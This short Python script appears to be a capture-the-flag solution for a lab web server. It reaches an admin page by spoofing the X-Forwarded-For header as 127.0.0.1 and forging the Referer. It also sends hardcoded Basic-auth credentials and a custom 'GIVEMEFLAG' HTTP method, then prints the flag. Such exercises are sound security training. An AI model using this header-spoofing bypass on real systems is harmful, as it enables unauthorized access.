from base64 import b64encode
from bs4 import BeautifulSoup
import requests

login_url = 'http://140.115.59.7:12002/admin'

login_headers = {
    "Host": "140.115.59.7:12002",
    "Referer": "https://www.adlSecurity.com", # Step 3
    "X-Forwarded-For": "127.0.0.1",  # Step 2
    "Authorization": None,
}


def set_login(username, password):
    authorization = b64encode(f"{username}:{password}".encode('utf-8')).decode('ascii')
    login_headers["Authorization"] = f"Basic {authorization}"


set_login("hitori", "hitorijanai")

response = requests.request(
    "GIVEMEFLAG", 
    login_url, 
    headers=login_headers, 
    timeout=5
)

if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')
    tag_content = soup.find('code').text.strip()
    print("Content within <code> tags:")
    print(tag_content)
